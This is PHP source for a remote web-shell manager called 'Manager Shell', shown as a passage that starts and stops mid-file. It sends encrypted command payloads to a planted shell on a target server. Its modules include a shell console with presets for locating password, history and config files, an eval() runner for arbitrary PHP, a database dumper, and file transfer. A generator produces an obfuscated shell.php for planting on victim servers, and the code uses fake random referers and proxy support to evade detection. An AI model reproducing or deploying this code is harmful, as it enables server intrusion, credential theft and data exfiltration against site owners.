		"locate config* files " => "locate config",
		"locate .conf files"=>"locate '.conf'",
		"locate .pwd files" => "locate '.pwd'",
		"locate .sql files" => "locate '.sql'",
		"locate .htpasswd files" => "locate '.htpasswd'",
		"locate .bash_history files" => "locate '.bash_history'",
		"locate .mysql_history files" => "locate '.mysql_history'",
		"locate .fetchmailrc files" => "locate '.fetchmailrc'",
		"locate backup files" => "locate backup",
		"locate dump files" => "locate dump",
		"locate priv files" => "locate priv"
	);

    if ((!empty($_POST['p1']))&& (empty($_POST['c']))) {
	echo @iconv("866", "UTF-8","\n$ ".$_POST['p1']."\n".ex($_POST['p1']));
    } else {
	echo '<div class=content>';
	echo '<label><select class="form-control" id="alias">';
	foreach($GLOBALS['aliases'] as $n => $v) {
		if($v == '') {
			echo '<optgroup label="-'.htmlspecialchars($n).'-"></optgroup>';
			continue;
		}
		echo '<option value="'.htmlspecialchars($v).'">'.$n.'</option>';
	}
	
	echo '</select></label><button onclick="g(\'Console\',\''.$GLOBALS['cwd'].'\',selBoxes(\'alias\'),null, null,\''.(isset($_POST['charset'])?$_POST['charset']:'').'\');return false;" class="btn btn-md btn-primary">submit</button><br/>';
	echo '<textarea class="form-control" id="output" style="border-bottom:0;margin-top:5px;width:100%;height:400px;" readonly>';
	if (!empty($_POST['p1'])) echo @iconv("866", "UTF-8","\n$ ".$_POST['p1']."\n".ex($_POST['p1']));
	echo' </textarea>';
	echo '<table style="border:1px solid #060a10;border-top:0px;" cellpadding=0 cellspacing=0 width="100%"><tr><td style="padding-left:4px; width:13px;">$</td><td><input type=text name=cmd style="border:0px;width:100%;" onkeydown="this.onkeypress = function($) {if ($.keyCode === 13) {g(\'Console\',\''.$GLOBALS['cwd'].'\',this.value,null, null,\''.(isset($_POST['charset'])?$_POST['charset']:'').'\');return false;}}"></td></tr></table>';
	echo '</div>';
   }	
EOD;

$Php = $_func.<<<'EOD'
    if(!empty($_POST['p1'])) {
	eval($_POST['p1']);
    } else {
	echo '<div class=content>';
	echo '<table cellpadding=0 cellspacing=0 width="100%"><tr><td style="vertical-align: top;"><textarea  class="form-control" id="php" style="width:95%;height:400px;"> </textarea><br />';
	echo '<button onclick="g(\'Php\',\''.$GLOBALS['cwd'].'\',document.getElementById(\'php\').value,null, null,\''.(isset($_POST['charset'])?$_POST['charset']:'').'\');return false;" class="btn btn-md btn-primary">submit</button><br/></td>';
	echo '<td style="vertical-align: top;"><textarea id="result" class="form-control" style="width:95%;height:400px;" readonly> </textarea></td></tr></table>';
	echo '</div>';
   }	
EOD;

$Sql = $_func.<<<'EOD'
	class DbClass {
		var $type;
		var $link;
		var $res;
		function DbClass($type)	{
			$this->type = $type;
		}
		function connect($host, $user, $pass, $dbname){
			switch($this->type)	{
				case 'mysql':
					if( $this->link = @mysql_connect($host,$user,$pass,true) ) return true;
					break;
				case 'pgsql':
					$host = explode(':', $host);
					if(!$host[1]) $host[1]=5432;
					if( $this->link = @pg_connect("host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname") ) return true;
					break;
			}
			return false;
		}
		function selectdb($db) {
			switch($this->type)	{
				case 'mysql':
					if (@mysql_select_db($db))return true;
					break;
			}
			return false;
		}
		function query($str) {
			switch($this->type) {
				case 'mysql':
					return $this->res = @mysql_query($str);
					break;
				case 'pgsql':
					return $this->res = @pg_query($this->link,$str);
					break;
			}
			return false;
		}
		function fetch() {
			$res = func_num_args()?func_get_arg(0):$this->res;
			switch($this->type)	{
				case 'mysql':
					return @mysql_fetch_assoc($res);
					break;
				case 'pgsql':
					return @pg_fetch_assoc($res);
					break;
			}
			return false;
		}
		function listDbs() {
			switch($this->type)	{
				case 'mysql':
                        return $this->query("SHOW databases");
				break;
				case 'pgsql':
					return $this->res = $this->query("SELECT datname FROM pg_database WHERE datistemplate!='t'");
				break;
			}
			return false;
		}
		function listTables() {
			switch($this->type)	{
				case 'mysql':
					return $this->res = $this->query('SHOW TABLES');
				break;
				case 'pgsql':
					return $this->res = $this->query("select table_name from information_schema.tables where table_schema != 'information_schema' AND table_schema != 'pg_catalog'");
				break;
			}
			return false;
		}
		function error() {
			switch($this->type)	{
				case 'mysql':
					return @mysql_error();
				break;
				case 'pgsql':
					return @pg_last_error();
				break;
			}
			return false;
		}
		function setCharset($str) {
			switch($this->type)	{
				case 'mysql':
					if(function_exists('mysql_set_charset'))
						return @mysql_set_charset($str, $this->link);
					else
						$this->query('SET CHARSET '.$str);
				break;
				case 'pgsql':
					return @pg_set_client_encoding($this->link, $str);
				break;
			}
			return false;
		}
		function loadFile($str) {
		        $pf=$str;
		        $fp = fopen($pf,"rb"); 
		        $bufer = fread($fp,filesize($pf)); 
		        fclose($fp); 
		        $bufer=str_replace(';'."\r\n",';'."\r",$bufer);
		        $bufer=str_replace(';'."\n",';'."\r",$bufer);
		        $quer = explode(';'."\r", $bufer); 
		        foreach($quer as $query) { 
		         $query = trim($query).';'; 
		         $query=str_replace("\r\n","\r",$query);
		         $query=str_replace("\n","\r",$query);
		         $wq='';
		         $qt = explode("\r", $query); 
		         foreach($qt as $qy) {
		          if ($qy!='')
		          if ($qy[0]!='-') $wq=$wq.$qy;
		         }
		         $wq = trim($wq); 
		         if (($wq!='')&&($wq!=';'))
		         if(!$this->query($wq)) return "Exec error: ".$wq;
		        }
			return true;
		}
		function dump($table, $fp = false) {
			switch($this->type)	{
				case 'mysql':
					$res = $this->query('SHOW CREATE TABLE `'.$table.'`');
					$create = mysql_fetch_array($res);
					$sql = $create[1].";\n";
					if($fp) fwrite($fp, $sql); else echo($sql);
					$this->query('SELECT * FROM `'.$table.'`');
					$i = 0;
					$head = true;
					while($▟ = $this->fetch()) {
					  $sql = '';
					  if($i % 1000 == 0) {
					    $head = true;
					    $sql = ";\n\n";
					  }
					  $columns = array();
					  foreach($▟ as $k=>$v) {
						if($v === null) $▟[$k] = "NULL";
						elseif(is_int($v)) $▟[$k] = $v;
						else $▟[$k] = "'".@mysql_real_escape_string($v)."'";
						$columns[] = "`".$k."`";
					  }
					  if($head) {
						$sql .= 'INSERT INTO `'.$table.'` ('.implode(", ", $columns).") VALUES \n\t(".implode(", ", $▟).')';
						$head = false;
					  } else $sql .= "\n\t,(".implode(", ", $▟).')';
					  if($fp) fwrite($fp, $sql); else echo($sql);
					  $i++;
					}
					if(!$head) if($fp) fwrite($fp, ";\n\n"); else echo(";\n\n");
				break;
				case 'pgsql':
					$this->query('SELECT * FROM '.$table);
					while($▟ = $this->fetch()) {
						$columns = array();
						foreach($▟ as $k=>$v) {
							$▟[$k] = "'".addslashes($v)."'";
							$columns[] = $k;
						}
						$sql = 'INSERT INTO '.$table.' ('.implode(", ", $columns).') VALUES ('.implode(", ", $▟).');'."\n";
						if($fp) fwrite($fp, $sql); else echo($sql);
					}
				break;
			}
			return false;
		}
	};

	$db = new DbClass($_POST['type']);
	if((@$_POST['p2']=='download') && (@$_POST['p1']!='select')) {
		$db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);
		$db->selectdb($_POST['sql_base']);
		if ($_POST['charset']=='') $_POST['charset']="UTF-8";
	        switch($_POST['charset']) {
	            case "Windows-1251": $db->setCharset('cp1251'); break;
	            case "UTF-8": $db->setCharset('utf8'); break;
	            case "KOI8-R": $db->setCharset('koi8r'); break;
	            case "KOI8-U": $db->setCharset('koi8u'); break;
	            case "cp866": $db->setCharset('cp866'); break;
	        }
		if($fp = @fopen($_POST['p1'], 'w')) {
			$x=explode(",", $_POST['p3']);
			foreach($x as $v) $db->dump($v, $fp);
			fclose($fp);
			unset($_POST['p2']);
			echo "Dump file ".$_POST['p1']." saved";

		} else die('<script>alert("Error! Can\'t open file");window.history.back(-1)</script>');
	}
	echo "<div class=content>
	<table cellpadding='2' cellspacing='0'><tr>
	<td>Type</td><td>Host</td><td>Login</td><td>Password</td><td>Database</td></tr><tr>
	<td><label><select class='form-control' id='type'><option value='mysql' ";
	if(@$_POST['type']=='mysql')echo 'selected';
	echo ">MySql</option><option value='pgsql' ";
	if(@$_POST['type']=='pgsql')echo 'selected';
	echo ">PostgreSql</option></select></label></td>
	<td><input class='form-control' ype=text id=sql_host value=\"". (empty($_POST['sql_host'])?'localhost':htmlspecialchars($_POST['sql_host'])) ."\"></td>
	<td><input class='form-control'  type=text id=sql_login value=\"". (empty($_POST['sql_login'])?'root':htmlspecialchars($_POST['sql_login'])) ."\"></td>
	<td><input class='form-control'  type=text id=sql_pass value=\"". (empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass'])) ."\"></td><td>";
	$tmp = "<input class='form-control' type=text id=sql_base value=''>";
	if(isset($_POST['sql_host'])){
		if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {
			switch($_POST['charset']) {
				case "Windows-1251": $db->setCharset('cp1251'); break;
				case "UTF-8": $db->setCharset('utf8'); break;
				case "KOI8-R": $db->setCharset('koi8r'); break;
				case "KOI8-U": $db->setCharset('koi8u'); break;
				case "cp866": $db->setCharset('cp866'); break;
			}
			$db->listDbs();
			echo "<label><select class='form-control' id=sql_base><option value=''></option>";
			while($▟ = $db->fetch()) {
				list($key, $value) = each($▟);
				echo '<option value="'.$value.'" '.($value==$_POST['sql_base']?'selected':'').'>'.$value.'</option>';
			}
			echo '</select></label>';
		}
		else echo $tmp;
	} else echo $tmp;
	echo '</td><td>';
	echo '<button  class="btn btn-md btn-primary" onclick="g(\'Sql\',\'query\',null,null, null,\''.(isset($_POST['charset'])?$_POST['charset']:'').'\',document.getElementById(\'sql_host\').value,document.getElementById(\'sql_login\').value,document.getElementById(\'sql_pass\').value,document.getElementById(\'sql_base\').value,document.getElementById(\'type\').value);return false;">submit</button>';
	echo "</td></tr></table>";

	if(isset($db) && $db->link){
		echo "<br/><table class='table table-bordered' width=100% cellpadding=2 cellspacing=0 style='vertical-align: top'>";
			if(!empty($_POST['sql_base'])){
				$db->selectdb($_POST['sql_base']);
				echo "<tr><td width=1 style='vertical-align: top'><span>Tables:</span><br><br>";
				$tbls_res = $db->listTables();
				while($m = $db->fetch($tbls_res)) {
					list($key, $value) = each($m);
					if(!empty($_POST['sql_count'])) $n = $db->fetch($db->query('SELECT COUNT(*) as n FROM '.$value.''));
					$value = htmlspecialchars($value);
					echo "<nobr><input  type='checkbox' value='".$value."' class='chkbx'>&nbsp;";
					echo '<a href=# onclick="g(\'Sql\',\'query\',\'select\',\''.$value.'\', 1,\''.(isset($_POST['charset'])?$_POST['charset']:'').'\',document.getElementById(\'sql_host\').value,document.getElementById(\'sql_login\').value,document.getElementById(\'sql_pass\').value,document.getElementById(\'sql_base\').value,document.getElementById(\'type\').value);return false;">'.$value.'</a>';
					echo "".(empty($_POST['sql_count'])?'&nbsp;':" <small>({$n['n']})</small>") . "</nobr><br>";

				}
				echo "Dump file:<input  class='form-control' style='width:200px' type=text id=dump value='dump.sql'>";
				echo '<button class="btn btn-md btn-primary" onclick="g(\'Sql\',null,document.getElementById(\'dump\').value,\'download\', checkBoxes(\'chkbx\'),\''.(isset($_POST['charset'])?$_POST['charset']:'').'\',document.getElementById(\'sql_host\').value,document.getElementById(\'sql_login\').value,document.getElementById(\'sql_pass\').value,document.getElementById(\'sql_base\').value,document.getElementById(\'type\').value);return false;">Dump</button><br>';
            if($_POST['type']=='mysql') {
                $db->query("SELECT 1 FROM mysql.user WHERE concat(`user`, '@', `host`) = USER() AND `File_priv` = 'y'");
                if($db->fetch()) {
				echo "Load file:<input class='form-control' style='width:200px' type=text id=load value='dump.sql'>";
				echo '<button class="btn btn-md btn-primary" onclick="g(\'Sql\',null,\'loadfile\',document.getElementById(\'load\').value, null,\''.(isset($_POST['charset'])?$_POST['charset']:'').'\',document.getElementById(\'sql_host\').value,document.getElementById(\'sql_login\').value,document.getElementById(\'sql_pass\').value,document.getElementById(\'sql_base\').value,document.getElementById(\'type\').value);return false;">Dump</button><br>';
		}

				echo "</td><td style='vertical-align: top'>";
				if(@$_POST['p1'] == 'select') {
					$_POST['p1'] = 'query';
					$_POST['p3'] = $_POST['p3']?$_POST['p3']:1;
					$db->query('SELECT COUNT(*) as n FROM ' . $_POST['p2']);
					$num = $db->fetch();
					$pages = ceil($num['n'] / 30);
					echo "<span>".$_POST['p2']."</span> ({$num['n']} records) Page # ".((int)$_POST['p3'])." of $pages";
					if($_POST['p3'] > 1)
						echo ' <a href=# onclick="g(\'Sql\',\'query\',\'select\',\''.$_POST['p2'].'\', \''.($_POST['p3']-1).'\',\''.(isset($_POST['charset'])?$_POST['charset']:'').'\',document.getElementById(\'sql_host\').value,document.getElementById(\'sql_login\').value,document.getElementById(\'sql_pass\').value,document.getElementById(\'sql_base\').value,document.getElementById(\'type\').value);return false;">&lt; Prev</a>';
					if($_POST['p3'] < $pages)
						echo ' <a href=# onclick="g(\'Sql\',\'query\',\'select\',\''.$_POST['p2'].'\', \''.($_POST['p3']+1).'\',\''.(isset($_POST['charset'])?$_POST['charset']:'').'\',document.getElementById(\'sql_host\').value,document.getElementById(\'sql_login\').value,document.getElementById(\'sql_pass\').value,document.getElementById(\'sql_base\').value,document.getElementById(\'type\').value);return false;">Next &gt;</a>';
					$_POST['p3']--;
					if($_POST['type']=='pgsql')
						$_POST['p2'] = 'SELECT * FROM '.$_POST['p2'].' LIMIT 30 OFFSET '.($_POST['p3']*30);
					else
						$_POST['p2'] = 'SELECT * FROM `'.$_POST['p2'].'` LIMIT '.($_POST['p3']*30).',30';
					echo "<br><br>";
				}
				if((@$_POST['p1'] == 'query') && !empty($_POST['p2'])) {
					$db->query(@$_POST['p2']);
					if($db->res !== false) {
						$title = false;
						echo '<table class="table table-bordered" width=100% cellspacing=1 cellpadding=2 id="data">';
						$line = 1;
						while($▟ = $db->fetch())	{
							if(!$title)	{
								echo '<tr style="background-color: #EEEEEE; opacity: 0.9;">';
								foreach($▟ as $key => $value)
									echo '<th>'.$key.'</th>';
								reset($▟);
								$title=true;
								echo '</tr><tr>';
								$line = 2;
							}
							echo '<tr class="l'.$line.'">';
							$line = $line==1?2:1;
							foreach($▟ as $key => $value) {
								if($value == null)
									echo '<td><i>null</i></td>';
								else
									echo '<td>'.nl2br(htmlspecialchars($value)).'</td>';
							}
							echo '</tr>';
						}
						echo '</table>';
					} else {
						echo '<div><b>Error:</b> '.htmlspecialchars($db->error()).'</div>';
					}
				}
				echo "<br><textarea id='query' class='form-control' style='width:100%;height:100px'>";
				if(!empty($_POST['p2']) && ($_POST['p1'] != 'loadfile')) echo htmlspecialchars($_POST['p2']);
		        	echo "</textarea><br/>";
				echo '<button class="btn btn-md btn-primary" onclick="g(\'Sql\',\'query\',\'select\',document.getElementById(\'query\').value, null,\''.(isset($_POST['charset'])?$_POST['charset']:'').'\',document.getElementById(\'sql_host\').value,document.getElementById(\'sql_login\').value,document.getElementById(\'sql_pass\').value,document.getElementById(\'sql_base\').value,document.getElementById(\'type\').value);return false;">submit</button>';
				echo "</td></tr>";
			}
			echo "</table><br/>";
            }

	    if(@$_POST['p1'] == 'loadfile') {
		$res = $db->loadFile($_POST['p2']);
		if ($res!=true) echo '<br/><pre class=ml1>'.htmlspecialchars($res).'</pre>'; else  echo '<br/><pre class=ml1>Loaded!</pre>';
	    }
	} else {
        echo htmlspecialchars($db->error());
    }
	echo '</div>';
EOD;



function _x($t,$k){for($i=0;$i<strlen($t);)for($j=0;$j<strlen($k);$j++,$i++)$o.=$t{$i}^$k{$j};return $o;};
function _s($l=10) {$c="abcdefghijklmnopqrstuvwxyz";$p=substr(str_shuffle($c),0,$l);return $p;}

function getContent($url,$post,$referer='') {
/*
   if ($post!='') {
        $opts = array('http'=>array('proxy'=>(defined('PROXY'))?('tcp://'.PROXY):null,'request_fulluri' => true,'method'=>'POST','user_agent'=>USER_AGENT,'header'=>'Content-type: application/x-www-form-urlencoded','content'=>$post));
   } else {
        $opts = array('http'=>array('proxy'=>(defined('PROXY'))?('tcp://'.PROXY):null,'request_fulluri' => true,'method'=>'GET','user_agent'=>USER_AGENT,));
   }
   $context  = stream_context_create($opts);
   $body= @file_get_contents($url, false, $context);
   $header=implode("\r\n", $http_response_header);
   $code=200;
   return array($body,$header,$code);
*/

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL,$url);
    curl_setopt ($ch, CURLOPT_USERAGENT, USER_AGENT);
    if (defined('PROXY')) {
      curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
      curl_setopt($ch, CURLOPT_PROXY,PROXY);
    }
    curl_setopt($ch, CURLOPT_VERBOSE, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);

    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    if ($referer!='') curl_setopt($ch, CURLOPT_REFERER, $referer);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15); 
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    if ($post) {
      curl_setopt($ch, CURLOPT_POST, 1);
      curl_setopt($ch, CURLOPT_POSTFIELDS,$post);
      curl_setopt($ch, CURLOPT_HTTPHEADER, array(
//       'Content-Type: application/x-www-form-urlencoded',
//       'Content-Length: ' . strlen($body),
//       'Content-MD5: ' . base64_encode(md5($body, true)),
//       'X-Cww-Tag: ' . $hdr,
      )); 
    }
    $response = curl_exec($ch);

    $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $header = substr($response, 0, $header_size);
    $body = substr($response, $header_size);
    curl_close($ch);
    return array($body,$header,$code);
}

function getExec($url,$cmd,$pst) {
   $pass=KEYS;
   $md5=base64_encode(md5(rand(1, 10000), true));
   $rat="@header('Content-MD5: ".$md5."');\r\n@header('Content-Type: text/html; charset=utf-8');\r\n";
   parse_str($pst, $ftd);
   foreach($ftd as $key => $val){ 
    $rat.="\$_POST['".$key."']=urldecode('".urlencode(urldecode($val))."');\r\n";
   }
   $cmd=$rat.$cmd;
   $pst="";
   $rnd=_s(6);
   $key=_s(6);
   $referer='http://'._s(8).'.com/?'._s(6).'='.$rnd.'&'._s(6).'='.$key;
   $cmd=base64_encode(_x(gzcompress($cmd),$pass.$key));
   $arr=array();
   $arr[$rnd]=$cmd;
   $post=http_build_query($arr);
   $res=getContent($url,$post,$referer);
   if ((strpos($res[1], $md5)>0)and($res[2]==200)) {$res[0]=@gzuncompress(@_x(@base64_decode($res[0]),$pass.$key));}else{$res[0]='';$res[2]=='404';};
   return $res;
}

$filename=basename($_FILES['file']['name']);
$filepath=$_FILES['file']['tmp_name'];
if (($filename)&&(file_exists($filepath))) {
    $h = file_get_contents($filepath);
    @unlink($filepath);
    $_POST['p2']=$filename;
    $_POST['p3']=$h;
    $pst='url='.urlencode($_POST['url']).'&a='.urlencode($_POST['a']).'&c='.urlencode($_POST['c']).'&p1='.urlencode($_POST['p1']).'&p2='.urlencode($_POST['p2']).'&p3='.urlencode($_POST['p3']);
    getExec($_POST['url'],$FilesMan,'&'.$pst);
    $_POST['submit']="Submit";
    $_POST['a']="FilesMan";
//    echo $result[0];
//    exit;
}

if ($_POST['a']=='FilesTools')  {
  if ($_POST['p2']=='download')  {
    $pst=file_get_contents('php://input');
    $result=getExec($_POST['url'],$FilesTools,'&'.$pst);
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename='.$_POST['p1']);
    header('Content-Transfer-Encoding: binary');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: '.strlen($result[0]));
    ob_clean();
    flush();
    echo $result[0];
    $_POST['submit']="Submit";
    $_POST['a']="FilesMan";
//    exit;
  }
 }


if ($_POST['ajax']<>'') {
  ob_end_clean();
  if ($_POST['url']) $_POST['url']=urldecode($_POST['url']);
  $pst = file_get_contents('php://input');
  if ($_POST['a']=='FilesTools')  {
    $result=getExec($_POST['url'],$FilesTools,'&'.$pst);
  }
  if ($_POST['a']=='FilesMan')  {
    $result=getExec($_POST['url'],$Menu.$FilesMan.$Footer,'&'.$pst);
  }
  if ($_POST['a']=='SecInfo')  {
    $result=getExec($_POST['url'],$Menu.$SecInfo,'&'.$pst);
  }
  if ($_POST['a']=='Console')  {
    if (($_POST['p1']<>'')&&($_POST['c']=='')) $result=getExec($_POST['url'],$Console,'&'.$pst);
    else $result=getExec($_POST['url'],$Menu.$Console,'&'.$pst);
  }
  if ($_POST['a']=='Php')  {
    if ($_POST['p1']<>'') {
	$result=getExec($_POST['url'],$Php,'&'.$pst);
        //$result[0]=$result[1]."\r\n".$result[0];
    } else $result=getExec($_POST['url'],$Menu.$Php,'&'.$pst);
  }
  if ($_POST['a']=='Sql')  {
    $result=getExec($_POST['url'],$Menu.$Sql,'&'.$pst);
  }
  echo $result[0];
  die();
}
$result='';              
if (($_POST['submit']<>'')) {
  $pst='url='.urlencode($_POST['url']).'&a='.urlencode($_POST['a']).'&c='.urlencode($_POST['c']).'&p1='.urlencode($_POST['p1']).'&p2='.urlencode($_POST['p2']).'&p3='.urlencode($_POST['p3']);
  $result=getExec($_POST['url'],$Menu.$FilesMan.$Footer,'&'.$pst);
}

 function ra($str,$length,$st,$sf,$nu=''){$res="";for($start=0,$len=$length;$subtext=substr($str,$start,$len);$start=$start+$len){if(($nu!='')&&($start==0))$res=$res.$nu.$subtext.$sf."\n";else $res=$res.$st.$subtext.$sf."\n";};return $res;};
 function rs($length=10){$chars="abcdefghijklmnopqrstuvwxyz";$password=substr(str_shuffle($chars),0,$length);return $password;};
 function rd($cnt=21){$i=1;$randomString=array();while($i<=$cnt){$el=rs(1);if(in_array($el,$randomString)!=true){$randomString[]=$el;$i=$i+1;};};return $randomString;};
 function p($s, $k){$o='';for($i=0;$i<strlen($s);++$i){if(rand(1,3)==3)$o=$o.$s[$i].$k;else$o=$o.$s[$i];};return $o;};
 function h($s){$o='';for($i=0;$i<strlen($s);++$i){if(rand(1,3)==3)$o=$o.'\x'.substr('0'.dechex(ord($s[$i])),-2);else $o=$o.$s[$i];};return $o;};
 function m($t, $k){for($i=0;$i<strlen($t);)for($j=0;$j<strlen($k);$j++,$i++)$o.=$t{$i}^$k{$j};return $o;};
 function w($s,$p) {
	$s=str_replace("\r","\n",$s);
	$s=str_replace("\n\n","",$s);
	$g=rd();
        $pack='$'.$g[0];
        $s=@gzcompress($s, 9);
        $pack="@gzuncompress($".$g[0].")";
        $method="@eval(".$pack.");";
 	$s=base64_encode($s);
        $s=ra($s,100,"\$".$g[0].".='","';","\$".$g[0]."='");
        $crypted="\$".$g[0]."=base64_decode(\$".$g[7].");";
	$f="<?php \n".$s."\$".$g[7]."=\$".$g[0].";".$crypted.$method."?>";
	return $f;                        
 }	


 if(isset($_POST['gen'])){ 
    $h = str_replace("%pass%", KEYS,$Shell);
    $s=$h;
    $p=rs();
    $v=w($s,$p);
    header('Content-Description: File Transfer');
    header('Content-Type: application/force-download');
    header('Content-Type: application/octet-stream');
    header('Content-Type: application/download');
    header('Content-Disposition: attachment; filename=shell.php');
    header('Content-Transfer-Encoding: binary');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . strlen($v));
    ob_clean();
    flush();
    echo $v;
    exit();
 }

?>
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Manager Shell</title>
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css" crossorigin="anonymous">
<style>
* {
   font-size: small;
}
.container {
  width:98%;
  margin-top: 10px;
}
.modal {
 display: none;
 position: fixed;
 z-index: 1;
 left: 0;
 top: 0;
 width: 100%;
 height: 100%;
 overflow: auto;
 background-color: rgba(0,0,0,0.6);
 z-index: 1000;
}
.modal .modal_content {
 background-color: #fefefe;
 margin: 15% auto;
 padding: 20px;
 border: 1px solid #888;
 width: 80%;
 z-index: 99999;
}
.modal .modal_content .close_modal_window {
 color: #aaa;
 float: right;
 font-size: 28px;
 font-weight: bold;
 cursor: pointer;
}
.table > tbody > tr > td {
   padding: 2px;
}
.table > tr > td {
   padding: 2px;
}

#data tbody tr:hover {
 background: #696969;
 color: #D3D3D3;
}

#data tbody tr:hover a {
 background: #696969;
 color: #D3D3D3;
}
</style>
<script>
var d = document;

function set_cookie(name, value, exp_y, exp_m, exp_d, path, domain, secure) {
  var cookie_string = name + "=" + escape(value);
  if ( exp_y ) {
    var expires = new Date ( exp_y, exp_m, exp_d );
    cookie_string += "; expires=" + expires.toGMTString();
  }
  if ( path ) cookie_string += "; path=" + escape (path);
  if ( domain ) cookie_string += "; domain=" + escape (domain);
  if ( secure ) cookie_string += "; secure";
  d.cookie = cookie_string;
}

function delete_cookie(cookie_name) {
  var cookie_date = new Date();
  cookie_date.setTime (cookie_date.getTime() - 1);
  d.cookie = cookie_name += "=; expires=" + cookie_date.toGMTString();
}

function get_cookie(cookie_name) {
  var results = d.cookie.match ( '(^|;) ?' + cookie_name + '=([^;]*)(;|$)' );
  if ( results )
    return (unescape(results[2]));
  else
    return null;
}

function checkBoxes(cls) {
	var checkboxes = d.getElementsByClassName(cls);
	var checkboxesChecked = [];
	for (var index = 0; index < checkboxes.length; index++) {
		if (checkboxes[index].checked) {
			checkboxesChecked.push(checkboxes[index].value);
		}
	}
	return checkboxesChecked;
}

function selBoxes(elName) {
	var e = d.getElementById(elName);
	return e.options[e.selectedIndex].value;
}

function change(idName) {
	if(d.getElementById(idName).style.display=='none') {
		d.getElementById(idName).style.display = '';
	} else {
		d.getElementById(idName).style.display = 'none';
	}
	return false;
}

function block(idName) {
	if(d.getElementById(idName).style.display=='none') {
		d.getElementById(idName).style.display = 'block';
	} else {
		d.getElementById(idName).style.display = 'none';
	}
	return false;
}

function ReqModal() {
	if((req.readyState == 4))
	if(req.status == 200) {
		d.getElementById('my_modal').style.display = 'block';
		d.getElementById('my_content').innerHTML=req.responseText;
	} else alert('Request error!');
}

function ReqFiles() {
	if((req.readyState == 4))
	if(req.status == 200) {
		d.getElementById('FilesMan').innerHTML=req.responseText;
	} else alert('Request error!');
}

function ReqConsole() {
	if((req.readyState == 4))
	if(req.status == 200) {
		t1=d.getElementById('output');
		t1.innerHTML=t1.innerHTML+req.responseText;
		t1.scrollTop=t1.scrollHeight;
	}
}

function ReqPhp() {
	if((req.readyState == 4))
	if(req.status == 200) {
		t2=d.getElementById('result');
		t2.innerHTML=req.responseText;
	}
}

function sr(url, params,a,c,p1,p2,p3,charset) {
	if (window.XMLHttpRequest)
		req = new XMLHttpRequest();
	else if (window.ActiveXObject)
		req = new ActiveXObject('Microsoft.XMLHTTP');
        if (req) {
                if ((a=='FilesMan')||(a=='SecInfo')||(a=='Console')||(a=='Php')||(a=='Sql')) {
		 if ((a=='Console')&&(p1!='')&&(c=='')) 
			req.onreadystatechange = ReqConsole;
		 else if ((a=='Php')&&(p1!='')) 
			req.onreadystatechange = ReqPhp;
		 else
			req.onreadystatechange = ReqFiles;
		} else {
			req.onreadystatechange = ReqModal;
		}
		req.open('POST', url, true);
		req.setRequestHeader ('Content-Type', 'application/x-www-form-urlencoded');
		req.send(params);
        }
}


function set(url,a,c,p1,p2,p3,charset) {
	if(url!=null)d.mf.url.value=url;
	if(a!=null)d.mf.a.value=a;
	if(c!=null)d.mf.c.value=c;
	if(p1!=null)d.mf.p1.value=p1;
	if(p2!=null)d.mf.p2.value=p2;
	if(p3!=null)d.mf.p3.value=p3;
	if(charset!=null)d.mf.charset.value=charset;
}

function g(a,c,p1,p2,p3,charset,sql_host,sql_login,sql_pass,sql_base,type) {
	if (a=='FilesMan') {
	 if (p1=='copy') {
		set_cookie("files", p2);
		set_cookie("dir", c);
		return;
	 }
	 if ((p1=='paste')||(p1=='move')) {
		p2=get_cookie("files");
		delete_cookie("files");
		p3=get_cookie("dir");
		delete_cookie("dir");
	 }
	}
	var params = 'ajax=true';
	params += '&url='+encodeURIComponent(d.getElementById('url').value);
	if(a==null) a='';
	params += '&a='+encodeURIComponent(a);
	if(c==null) c='';
	params += '&c='+encodeURIComponent(c);
	if(p1==null) p1='';
	params += '&p1='+encodeURIComponent(p1);
	if(p2==null) p2='';
	params += '&p2='+encodeURIComponent(p2);
	if(p3==null) p3='';
	params += '&p3='+encodeURIComponent(p3);
	if(charset==null) charset='';
	params += '&charset='+encodeURIComponent(charset);

	if(sql_host==null) sql_host='';
	params += '&sql_host='+encodeURIComponent(sql_host);
	if(sql_login==null) sql_login='';
	params += '&sql_login='+encodeURIComponent(sql_login);
	if(sql_pass==null) sql_pass='';
	params += '&sql_pass='+encodeURIComponent(sql_pass);
	if(sql_base==null) sql_base='';
	params += '&sql_base='+encodeURIComponent(sql_base);
	if(type==null) type='';
	params += '&type='+encodeURIComponent(type);
	sr(window.location.href, params,a,c,p1,p2,p3,charset);
}

function a(a,c,p1,p2,p3,charset) {
	set(d.getElementById('url').value,a,c,p1,p2,p3,charset);
	d.mf.submit();
}


</script>

</head>
<body style="background-color: #f2f3f4;">
<div class="container">

<form method=post name=mf style='display:none;'>
<input type=hidden name=url>
<input type=hidden name=a>
<input type=hidden name=c>
<input type=hidden name=p1>
<input type=hidden name=p2>
<input type=hidden name=p3>
<input type=hidden name=charset>
</form>

<div id="my_modal" class="modal" style="display: none;">
  <div class="modal_content">
    <span class="close_modal_window" onclick="block('my_modal');return false;">×</span>
    <p id="my_content"> </p>
  </div>
</div>

<div id="wrapper">
	<form class="form-inline" method="post">
